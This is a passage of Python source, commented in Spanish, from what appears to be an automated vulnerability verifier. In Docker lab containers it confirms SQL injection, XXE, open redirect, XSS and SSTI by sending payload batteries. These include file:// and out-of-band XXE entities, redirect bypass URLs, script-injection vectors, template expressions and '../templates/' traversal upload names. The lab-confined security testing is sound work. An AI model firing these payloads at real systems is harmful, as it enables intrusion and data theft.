                        and _size_diff >= 10 and _bt != _bf):
                    found = True
                    res.evidence["payload_ganador"] = _true_pl
                    res.evidence["payload_false"] = _false_pl
                    res.evidence["respuesta_true_len"] = len(_bt)
                    res.evidence["respuesta_false_len"] = len(_bf)
                    res.evidence["estrategia"] = "boolean-inband"
                    res.evidence["respuesta_cuerpo_recorte"] = _bt[:500]
                    step(f"VERIFICADO (boolean in-band): '{_true_pl}' devolvio {len(_bt)} bytes "
                         f"vs '{_false_pl}' devolvio {len(_bf)} bytes -- diferencia de "
                         f"{_size_diff} bytes confirma inyeccion SQLi.")
                    break

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            estrategia = res.evidence.get("estrategia", "tiempo")
            if estrategia == "backtick-identifier-error-based":
                res.detail = (f"SQLI IDENTIFIER MYSQL confirmada (error-based): {sqli_param}="
                              f"{res.evidence['payload_ganador']!r} cambio el codigo HTTP de "
                              f"{res.evidence['backtick_control_status']} a "
                              f"{res.evidence['backtick_error_status']} con error SQL en el cuerpo "
                              f"-- la entrada llega sin sanitizar al contexto backtick de MySQL")
            elif estrategia == "boolean-inband":
                res.detail = (f"SQLI BOOLEAN IN-BAND confirmada: '{sqli_param}={res.evidence['payload_ganador']!r}' "
                              f"devolvio {res.evidence['respuesta_true_len']} bytes vs "
                              f"'{res.evidence['payload_false']!r}' devolvio "
                              f"{res.evidence['respuesta_false_len']} bytes -- diferencia de "
                              f"{res.evidence['respuesta_true_len'] - res.evidence['respuesta_false_len']} bytes "
                              f"confirma que la entrada llega al motor SQL sin sanitizar")
            else:
                res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
                              f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
                              f"consistente en 2 peticiones independientes, por encima de la linea "
                              f"base + la mitad del retraso pedido -- no es ruido de red/Docker")
            step("capturando evidencia visual (screenshots del laboratorio)...")
            shots, http_caps = _take_generic_screenshots_sqli(
                base_url, endpoint_path, m, base_params, sqli_param, res.evidence)
            if shots:
                res.evidence["screenshots"] = shots
            if http_caps:
                res.evidence["http_captures"] = http_caps
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de contexto/dialecto de "
                          f"SLEEP y ninguna retraso la respuesta de forma consistente -- la SQLi "
                          f"ciega por tiempo no se confirmo (puede que el endpoint/parametro no "
                          f"sean los reales, que el motor no soporte ninguno de los dialectos "
                          f"probados, o que de verdad no haya inyeccion)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_xxe(
    source_dir: str, endpoint: str, http_method: str, parameters,
    xml_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_xxe: planta un canario dentro del contenedor real
    del objetivo y prueba las mismas variantes de entidad externa (DOCTYPE normal, parametro-
    entidad, envuelta en SOAP) como parametro de formulario y como cuerpo crudo
    (application/xml, text/xml). Si ninguna devuelve el secreto en banda, cae al mismo fallback
    OOB/ciego via el listener interno que SSRF -- el mecanismo (parser XML resolviendo
    file://, o una URL externa) no depende del stack que procese el XML."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"contenedor del objetivo)...")
        if not lab.write_canary(container, canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        xxe_general = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                       f'"file://{canary_path}">]><foo>&xxe;</foo>')
        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
                           f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><soap:Envelope '
                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
        xml_variants = [("entidad general (DOCTYPE normal)", xxe_general),
                        ("parametro-entidad", xxe_param_entity),
                        ("envuelta en SOAP", xxe_soap)]

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "xml_param": xml_param or "(cuerpo crudo)",
                             "canary_path": canary_path, "canary_secret": secret})

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            try:
                resp = _http_request(m, base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            present = secret in (resp.text or "")
            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta ({label}).")

        for label, xml_body in xml_variants:
            if found:
                break
            if xml_param:
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[xml_param] = xml_body
                try_send(f"{label}, parametro de formulario",
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
            if not found:
                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
                         headers={"Content-Type": "application/xml"})
            if not found:
                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
                         headers={"Content-Type": "text/xml"})

        res.evidence["intentos"] = tried

        if not found:
            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
                 "listener interno...")
            listener = lab.start_listener()
            if listener:
                oob_token = _token()
                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                          f'<foo>&xxe;</foo>')
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                try:
                    if xml_param:
                        payload[xml_param] = oob_xml
                        _http_request(m, base_url + endpoint, timeout=20,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None)
                    else:
                        _http_request(m, base_url + endpoint, data=oob_xml.encode(),
                                        headers={"Content-Type": "application/xml"}, timeout=20)
                except Exception:
                    pass
                time.sleep(2)
                oob_log = lab.listener_log()
                oob_hit = oob_token in oob_log
                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
                if oob_hit:
                    found = True
                    res.evidence["tecnica"] = "oob-blind"
                    res.evidence["modo_ganador"] = "OOB via listener interno"

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "oob-blind":
                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
                              "entidad externa apuntando a un listener interno (inalcanzable "
                              "desde fuera del laboratorio), y la conexion llego con el token "
                              "exacto -- prueba de que el parser resuelve entidades externas "
                              "arbitrarias, aunque no se extrajo el contenido del fichero")
            else:
                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
                              f"contiene el secreto exacto plantado en {canary_path} -- el "
                              f"parser XML resolvio una entidad externa apuntando al sistema de "
                              f"ficheros real")
            _xxe_body = res.evidence.get("respuesta_cuerpo_recorte", "")
            _xxe_hl = res.evidence.get("canary_secret", "") or "SYSTEM"
            _xxe_url = base_url + (endpoint or "/")
            _add_exploit_evidence(
                res=res, method=m, url=_xxe_url, resp_or_body=_xxe_body,
                highlight=_xxe_hl,
                caption_es=(f"XXE CONFIRMADA ({res.evidence.get('modo_ganador','')}): "
                            f"entidad externa resuelta, secreto plantado en respuesta."),
                caption_en=(f"XXE CONFIRMED ({res.evidence.get('modo_ganador','')}): "
                            f"external entity resolved, planted secret in response."),
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
                          f"nada -- el XXE no se confirmo (puede que el parser tenga las "
                          f"entidades externas desactivadas, o el endpoint/parametro no son los "
                          f"reales)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_open_redirect(
    source_dir: str, endpoint: str, http_method: str, parameters,
    redirect_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_open_redirect: manda la misma bateria de variantes de
    URL externa/bypass (directa, protocol-relative, backslash, userinfo, espacios/tabs,
    subdominio del host confiable) con allow_redirects=False, y solo marca verificado si la
    respuesta es un 3xx con Location conteniendo el dominio externo exacto -- el mecanismo de
    prueba (inspeccionar la cabecera Location real) no depende del stack."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
    if not redirect_param:
        res.detail = "no se identifico el parametro que lleva la URL de destino"
        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
                               "lleva la URL de destino; afina 'parameters' o pasalo a mano "
                               "(redirect_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token = _token()
        evil_host = f"binoracle-lab-redirect-{token}.invalid"
        targets = [
            f"https://{evil_host}/pwned",
            f"//{evil_host}/pwned",
            f"https:/\\{evil_host}/pwned",
            f"https:\\\\{evil_host}\\pwned",
            f"https://trusted.example.com@{evil_host}/pwned",
            f"https://{evil_host}\\@trusted.example.com/pwned",
            f" https://{evil_host}/pwned",
            f"\thttps://{evil_host}/pwned",
            f"https://{evil_host}#@trusted.example.com/",
            f"https://trusted.example.com.{evil_host}/pwned",
            # triple/cuadruple slash y slash inicial delante de URL absoluta -- casuistica real
            # de Open Redirect/Intruder/Open-Redirect-payloads.txt en PayloadsAllTheThings.
            f"///{evil_host}/pwned", f"////{evil_host}/pwned",
            f"/https://{evil_host}/pwned",
        ]
        # ademas de las anteriores, las ~155 variantes generalizables de las 3 wordlists de Open
        # Redirect en PayloadsAllTheThings (ver payload_kb.load_open_redirect_templates).
        targets += load_open_redirect_templates(evil_host)
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        tried = []
        confirmed_entry = None
        for target in targets:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[redirect_param] = target
            try:
                resp = _http_request(m, base_url + endpoint, timeout=15,
                                        data=payload if m != "GET" else None,
                                        params=payload if m == "GET" else None,
                                        allow_redirects=False,
                                        headers=custom_headers or None)
            except Exception as e:
                tried.append({"target": target, "error": str(e)})
                continue
            location = resp.headers.get("Location", "")
            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
            tried.append({"target": target, "status": resp.status_code, "location": location,
                         "confirmado": confirmed})
            if confirmed:
                confirmed_entry = tried[-1]
                break
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
                             "metodo": m, "intentos": tried})

        if confirmed_entry:
            res.verified = True
            res.ok = True
            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
            res.evidence["location_recibida"] = confirmed_entry["location"]
            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
                          f"de verdad a un dominio externo controlado por el atacante")
            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
                 f"externo enviado.")
            _redir_body = (f"HTTP/1.1 {confirmed_entry['status']} Found\n"
                           f"Location: {confirmed_entry['location']}\n\n"
                           f"Redirect to attacker-controlled domain confirmed")
            _add_exploit_evidence(
                res=res, method=m, url=base_url + (endpoint or "/"),
                resp_or_body=_redir_body,
                highlight=confirmed_entry["location"],
                caption_es=(f"OPEN REDIRECT CONFIRMADO: {redirect_param}={confirmed_entry['target']!r} "
                            f"→ {confirmed_entry['status']} Location: {confirmed_entry['location']}"),
                caption_en=(f"OPEN REDIRECT CONFIRMED: {redirect_param}={confirmed_entry['target']!r} "
                            f"→ {confirmed_entry['status']} Location: {confirmed_entry['location']}"),
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
                          f"para {redirect_param} y ninguna produjo un redirect con "
                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
            if tried:
                first = tried[0]
                res.evidence["respuesta_cuerpo_recorte"] = (
                    f"status={first.get('status')} location={first.get('location')!r}")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_xss(
    source_dir: str, endpoint: str, http_method: str, parameters,
    xss_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_xss: carga la respuesta en un Chromium headless REAL
    (ver _xss_render) y prueba la misma bateria de variantes elegidas a mano (rotura de HTML/
    atributo/contexto JS-string/URI) MAS las ~500 variantes generalizables de
    xss_alert_identifiable.txt en PayloadsAllTheThings -- solo se marca verificado si
    document.title cambia EXACTO al marcador, prueba de ejecucion real de JS, no de que el
    payload simplemente aparezca en el HTML crudo de la respuesta."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not xss_param:
        res.detail = "no se identifico el parametro donde se refleja el payload"
        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
                               "afina 'parameters' o pasalo a mano (xss_param_hint)")
        return res

    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
                     "navegador real para confirmar EJECUCION, no basta ver el payload "
                     "reflejado en el HTML crudo")
        res.limitations.append("verificacion dinamica NO intentada: falta Playwright "
                               "(pip install playwright && playwright install chromium)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        token = _token()
        marker = f"binoracle-xss-{token}"
        js = f"document.title='{marker}'"
        attempts = [
            f"<script>{js}</script>",
            f"<img src=x onerror=\"{js}\">",
            f"<svg onload=\"{js}\">",
            f"<body onload=\"{js}\">",
            f"<iframe src=\"javascript:{js}\"></iframe>",
            f"<details open ontoggle=\"{js}\">x</details>",
            f"\"><script>{js}</script>",
            f"'><script>{js}</script>",
            f"\" onmouseover=\"{js}\" x=\"",
            f"' onmouseover='{js}' x='",
            f"';{js};//", f'";{js};//',
            f"</script><script>{js}</script>",
            f"javascript:{js}",
            f"<ScRiPt>{js}</sCrIpT>",
            f"<svg/onload=\"{js}\">",
        ]
        attempts += load_xss_payloads(js)

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        found = False
        tried = []
        # UN SOLO navegador para los ~500+ intentos (ver _XssBrowserSession): arrancar un
        # Chromium por payload, confirmado en vivo, tarda minutos -- el coste real es el
        # arranque del propio navegador, no la navegacion entre paginas.
        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
        with _XssBrowserSession() as xb:
            for payload_value in attempts:
                params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                params[xss_param] = payload_value
                title, _ = xb.render(base_url, endpoint, m, params, [])
                tried.append({"payload": payload_value, "title_resultante": title})
                if title == marker:
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
                         f"cambio exactamente a '{marker}'.")
                    from urllib.parse import urlencode
                    _xss_url = base_url + endpoint + ("&" if "?" in endpoint else "?") + urlencode(params)
                    _, _xss_png = xb.render(base_url, endpoint, m, params, [], capture=True)
                    if _xss_png:
                        res.evidence.setdefault("screenshots", []).append({
                            "png_b64": _xss_png, "url": _xss_url,
                            "caption_es": (f"XSS confirmado: el navegador Chromium headless "
                                           f"ejecuto el script inyectado en '{xss_param}' -- "
                                           f"document.title cambio a '{marker}' (prueba de "
                                           f"ejecucion JS real, no solo reflexion de texto)."),
                            "caption_en": (f"XSS confirmed: headless Chromium executed the "
                                           f"injected script in '{xss_param}' -- document.title "
                                           f"changed to '{marker}' (proof of real JS execution, "
                                           f"not just text reflection)."),
                        })
                    _xss_body = (f"XSS EJECUTADO — document.title = '{marker}'\n\n"
                                 f"Parametro: {xss_param}\n"
                                 f"Payload: {payload_value}\n"
                                 f"URL completa:\n{_xss_url}")
                    _add_exploit_evidence(
                        res=res, method=m, url=_xss_url,
                        resp_or_body=_xss_body, highlight=marker,
                        caption_es=(f"XSS CONFIRMADO: script ejecutado en '{xss_param}' — "
                                    f"document.title cambio a '{marker}' en Chromium headless."),
                        caption_en=(f"XSS CONFIRMED: script executed in '{xss_param}' — "
                                    f"document.title changed to '{marker}' in headless Chromium."),
                    )
                    break
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "xss_param": xss_param, "token": token, "metodo": m,
                             "intentos_count": len(tried)})
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"XSS confirmado: el navegador real EJECUTO el script inyectado en "
                          f"{xss_param} -- document.title cambio exactamente a '{marker}', algo "
                          f"que solo el motor JS del navegador pudo hacer, no una coincidencia de "
                          f"texto reflejado")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
                          f"ninguna el navegador ejecuto el script -- el XSS no se confirmo "
                          f"(puede que el contexto de reflexion sea distinto, que haya "
                          f"sanitizacion real, o que el efecto solo se vea en otra pagina)")
            try:
                sample_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                sample_params[xss_param] = attempts[0] if attempts else ""
                sample_resp = _http_request(m, base_url + endpoint,
                                            data=sample_params if m != "GET" else None,
                                            params=sample_params if m == "GET" else None, timeout=15)
                res.evidence["respuesta_cuerpo_recorte"] = (getattr(sample_resp, "text", "") or "")[:500]
            except Exception:
                pass
        res.evidence["intentos"] = tried[:50]
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_ssti(
    source_dir: str, endpoint: str, http_method: str, parameters,
    ssti_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_ssti: el payload pide al motor de plantillas que
    CALCULE una operacion aritmetica con dos numeros aleatorios; si el resultado (que no aparece
    en ningun punto del payload enviado) sale en la respuesta, es prueba de que el motor EVALUO
    codigo, no que lo reflejo como texto. Incluye las plantillas elegidas a mano MAS todas las
    generalizables de ssti.fuzz en PayloadsAllTheThings.

    Comportamiento de descubrimiento autonomo: antes de usar el endpoint que propuso el LLM,
    escanea el codigo fuente en source_dir buscando rutas Flask/Sinatra reales (@app.route,
    request.args.get). Las rutas descubiertas se prueban primero; solo si fallan se recurre
    al endpoint del LLM. Esto elimina la dependencia de que el LLM adivine el endpoint exacto
    a partir de la descripcion NVD (que no lo menciona).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    # --- Descubrimiento autonomo de rutas desde el codigo fuente ---
    scanned = _scan_web_routes(source_dir) if source_dir else []
    if scanned:
        step(f"escaneo de fuente: {len(scanned)} ruta(s) encontrada(s): " +
             ", ".join(ep for ep, _, _ in scanned))

    _params_list_ssti = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS) or (_params_list_ssti[0] if _params_list_ssti else "")

    # Si el LLM no identifico parametro pero el escaneo si, usar la primera ruta con parametro
    if not ssti_param and scanned:
        for s_ep, s_params, s_meth in scanned:
            s_p = _pick_param(s_params, _XSS_HINTS) or (list(s_params.keys())[0] if s_params else "")
            if s_p:
                endpoint, parameters, http_method, ssti_param = s_ep, s_params, s_meth, s_p
                step(f"escaneo de fuente: parametro no identificado por LLM -- usando ruta "
                     f"descubierta: {s_ep} param={s_p}")
                break

    if not ssti_param:
        res.detail = "no se identifico el parametro que llega al motor de plantillas"
        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
                               "plantilla; afina 'parameters' o pasalo a mano (ssti_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = a * b
        mul = f"{a}*{b}"
        hand_made = [
            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
            f"-}}{{{mul}}}{{-", f"\">{{{{{mul}}}}}<\"",
        ]
        attempt_pairs = [(p, expected) for p in hand_made] + load_ssti_arithmetic_payloads(a, b)

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"

        # Construir lista ordenada de candidatos: rutas del escaneo primero, luego LLM
        candidates: list = []
        seen_cands: set = set()
        for s_ep, s_params, s_meth in scanned:
            s_p = _pick_param(s_params, _XSS_HINTS) or (list(s_params.keys())[0] if s_params else "")
            if s_p:
                key = (s_ep, s_p, s_meth.upper())
                if key not in seen_cands:
                    seen_cands.add(key)
                    candidates.append((s_ep, s_params, s_meth.upper(), s_p, True))
        # Endpoint del LLM como fallback si no es igual a uno ya escaneado
        llm_key = (endpoint, ssti_param, m)
        if endpoint and llm_key not in seen_cands:
            candidates.append((endpoint, parameters, m, ssti_param, False))
        if not candidates:
            candidates.append((endpoint or "/", parameters, m, ssti_param, False))

        found = False
        tried_all: list = []
        win_ep = endpoint or "/"
        win_param = ssti_param

        for cand_ep, cand_params, cand_meth, cand_p, from_scan in candidates:
            if from_scan:
                step(f"escaneo de fuente: probando ruta descubierta: {cand_ep} param={cand_p}")
            ep_path = cand_ep.split("?")[0] if cand_ep and "?" in cand_ep else (cand_ep or "/")
            tried: list = []
            for payload_value, payload_expected in attempt_pairs:
                pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
                payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
                payload[cand_p] = payload_value
                try:
                    resp = _http_request(cand_meth, base_url + ep_path, timeout=15,
                                         data=payload if cand_meth != "GET" else None,
                                         params=payload if cand_meth == "GET" else None,
                                         headers=custom_headers or None)
                except Exception as e:
                    tried.append({"payload": payload_value, "error": str(e)})
                    continue
                matched = bool(pattern.search(resp.text or ""))
                tried.append({"payload": payload_value, "status": resp.status_code,
                              "resultado_presente": matched})
                if matched:
                    found = True
                    win_ep, win_param = cand_ep, cand_p
                    res.evidence["payload_ganador"] = payload_value
                    res.evidence["resultado_esperado_ganador"] = payload_expected
                    res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                    step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                         f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                    _ssti_url = base_url + ep_path
                    _add_exploit_evidence(
                        res=res, method=cand_meth, url=_ssti_url,
                        resp_or_body=resp, highlight=str(payload_expected),
                        caption_es=(f"SSTI CONFIRMADA: '{cand_p}'={payload_value!r} — "
                                    f"motor evaluo expresion y devolvio {payload_expected} "
                                    f"(no estaba en el payload enviado)."),
                        caption_en=(f"SSTI CONFIRMED: '{cand_p}'={payload_value!r} — "
                                    f"engine evaluated expression and returned {payload_expected} "
                                    f"(not in the sent payload)."),
                    )
                    step("captura HTTP guardada en el informe.")
                    break
            tried_all.extend(tried)
            if found:
                break

        # --- Multi-step SSTI: upload-then-render (e.g. CVE-2026-27641 flask-reuploaded) --------
        # Algunos ataques SSTI requieren dos peticiones: (1) subir un fichero que contiene
        # sintaxis de plantilla a traves de un endpoint de subida con path traversal, (2) rendir
        # ese fichero desde un endpoint de renderizado. El verificador simple (una sola peticion)
        # no los cubre. Detectamos el patron buscando en las rutas escaneadas:
        #   - Un endpoint de SUBIDA: POST con params que incluyan 'name' o 'filename' (upload).
        #   - Un endpoint de RENDERIZADO: GET con __RENDERS_TEMPLATE__ en sus params.
        # Si ambos existen, intentamos la cadena upload -> render.
        if not found:
            _upload_eps = [(ep, ps, me) for ep, ps, me in scanned
                          if me == "POST" and any(k in ("name", "filename", "file", "path")
                                                  for k in (ps or {}))]
            _render_eps = [(ep, ps, me) for ep, ps, me in scanned
                           if me == "GET" and isinstance(ps, dict)
                           and ps.get("__RENDERS_TEMPLATE__")]
            if _upload_eps and _render_eps:
                step("intentando SSTI multi-step: upload traversal -> render...")
                import io as _io
                _ssti_payloads_ms = [
                    "{{" + str(a) + "*" + str(b) + "}}",
                    "${" + str(a) + "*" + str(b) + "}",
                    "#{" + str(a) + "*" + str(b) + "}",
                ]
                for _up_ep, _up_ps, _up_me in _upload_eps:
                    if found:
                        break
                    for _ssti_pl in _ssti_payloads_ms:
                        if found:
                            break
                        _tpl_name = f"binoracle_ssti_{_token()}.html"
                        _tpl_content = f"<!-- binoracle test -->{_ssti_pl}"
                        # Build a traversal name that writes to templates/ (or similar)
                        # Common patterns: ../templates/<name>, ../../templates/<name>
                        _name_candidates = [
                            f"../templates/{_tpl_name}",
                            f"../../templates/{_tpl_name}",
                            f"../views/{_tpl_name}",
                        ]
                        for _nc in _name_candidates:
                            if found:
                                break
                            try:
                                _file_obj = _io.BytesIO(_tpl_content.encode())
                                _up_url = base_url + _up_ep
                                _up_params = dict(_up_ps) if isinstance(_up_ps, dict) else {}
                                _up_params.pop("__RENDERS_TEMPLATE__", None)
                                # Set traversal name in the name/filename param
                                for _np in ("name", "filename", "file", "path"):
                                    if _np in _up_params:
                                        _up_params[_np] = _nc
                                        break
                                else:
                                    _up_params["name"] = _nc
                                _up_resp = _http_request(
                                    "POST", _up_url, timeout=15, params=_up_params,
                                    files={"file": (_tpl_name, _file_obj, "text/html")})
                                if _up_resp.status_code not in (200, 201, 204):
                                    continue
                                # Try rendering -- strip Flask path variables like <path:var>
                                for _rend_ep, _rend_ps, _rend_me in _render_eps:
                                    _rend_base = re.sub(r'/<[^>]+>', '', _rend_ep)
                                    _rend_url = base_url + _rend_base.rstrip("/") + "/" + _tpl_name
                                    _rend_resp = _http_request("GET", _rend_url, timeout=15)
                                    if str(expected) in (_rend_resp.text or ""):
                                        found = True
                                        win_ep, win_param = _rend_ep, "URL_PATH"
                                        res.evidence["payload_ganador"] = _ssti_pl
                                        res.evidence["upload_name_ganador"] = _nc
                                        res.evidence["render_url_ganador"] = _rend_url
                                        res.evidence["resultado_esperado_ganador"] = str(expected)
                                        res.evidence["respuesta_cuerpo_recorte"] = (
                                            _rend_resp.text or "")[:500]
                                        step(f"VERIFICADO (multi-step): upload {_nc!r} + render "
                                             f"{_rend_url!r} devolvio {expected}.")
                                        _add_exploit_evidence(
                                            res=res, method="GET", url=_rend_url,
                                            resp_or_body=_rend_resp, highlight=str(expected),
                                            caption_es=(f"SSTI multi-step CONFIRMADA: upload "
                                                        f"'{_nc}' + render devolvio {expected} "
                                                        f"— motor evaluo '{_ssti_pl}'."),
                                            caption_en=(f"Multi-step SSTI CONFIRMED: upload "
                                                        f"'{_nc}' + render returned {expected} "
                                                        f"— engine evaluated '{_ssti_pl}'."),
                                        )
                                        break
                            except Exception:
                                pass
        # ------------------------------------------------------------------------------------

        # Strip query string from endpoint - params are always sent via params= dict separately;
        # duplicate query params (from both the endpoint path and params=) would make Flask/Django
        # use the placeholder literal instead of the payload.
